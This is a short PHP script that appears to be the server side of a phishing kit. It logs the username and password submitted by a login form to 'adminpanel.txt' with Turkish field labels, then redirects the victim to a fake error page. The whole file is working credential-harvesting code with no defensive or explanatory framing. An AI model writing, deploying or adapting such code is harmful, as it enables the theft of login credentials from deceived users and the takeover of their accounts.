<?php

file_put_contents("adminpanel.txt", "Kullanici Adi: " . $_POST['username'] . " Sifre: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: eror.html');
exit();
